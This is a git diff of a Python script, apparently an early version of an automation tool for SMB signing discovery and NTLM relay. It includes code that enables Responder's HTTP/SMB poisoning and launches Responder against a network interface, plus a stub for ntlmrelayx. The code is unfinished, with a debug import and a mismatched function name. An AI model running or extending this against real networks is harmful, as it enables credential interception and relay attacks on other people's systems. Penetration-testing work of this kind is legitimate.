@@ -8,7 +8,11 @@ import sys
 from src.utils import *
 from src.smb import get_unsigned_hosts
 from src.process import Process
+from src.poisoner import start_responder
 from netaddr import IPNetwork, AddrFormatError
+
+# debug
+from IPython import embed
 
 def parse_args():
     # Create the arguments
@@ -44,46 +48,23 @@ def parse_hostlist(hostlist):
 
     return hosts
 
-def edit_resp_conf(switch, protocols, conf):
-    """
-    Edit Responder.conf
-
-    Mandatory arguments:
-    - switch : string of On or Off
-    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
-    - conf : the Responder.conf config file location
-    """
-    if switch == 'On':
-        opp_switch = 'Off'
-    else:
-        opp_switch = 'On'
-    with open(conf, 'r') as f:
-        filedata = f.read()
-    for p in protocols:
-        # Make sure the change we're making is necessary
-        if re.search(p + ' = ' + opp_switch, filedata):
-            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
-    with open(conf, 'w') as f:
-        f.write(filedata)
-
-def start_responder(iface=None):
-    if not iface:
-        iface = get_iface()
-    protocols = ['HTTP', 'SMB']
-    switch = 'On'
-    edit_responder_conf(switch, protocols)
-    cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
-    Responder = Process(cmd)
-    resp_proc = Responder.run('logs/Responder.log')
-    return Responder
-
 async def main():
-    hostlist = '/home/dan/PycharmProjects/autorelayx/nocommit/hostlist.txt'
+#   hostlist = args.hostlist
+    hostlist = '/home/dan/PycharmProjects/autorelayx/nocommit/home.txt'
     hosts = parse_hostlist(hostlist)
     unsigned_hosts = await get_unsigned_hosts(loop, hosts)
 
+    if len(unsigned_hosts) == 0:
+        print_bad('No hosts with SMB signing disabled found')
+        sys.exit()
+
+    print(unsigned_hosts)
+
     # Start Responder
-    Responder = start_responder()
+#    Responder = start_responder()
+    # Start ntlmrelayx
+
+
 
 if __name__ == "__main__":
 
